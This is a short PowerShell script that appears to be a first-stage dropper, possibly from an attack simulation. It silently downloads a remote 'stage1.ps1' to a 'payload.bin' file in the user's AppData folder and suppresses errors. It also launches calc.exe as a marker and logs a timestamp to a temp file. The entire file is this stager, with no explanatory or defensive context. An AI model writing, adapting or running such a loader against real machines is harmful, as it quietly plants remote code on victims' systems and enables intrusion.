
[CmdletBinding()]
param(
    [string]$RemoteUrl = "https://localhost:8081/stage1.ps1",
    [string]$DropPath = "$env:APPDATA\payload.bin",
    [int]$TransferTimeout = 236
)
try { Invoke-WebRequest -Uri $RemoteUrl -OutFile $DropPath -UseBasicParsing -ErrorAction SilentlyContinue; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append } catch { Write-Warning "Stage transfer failed" }
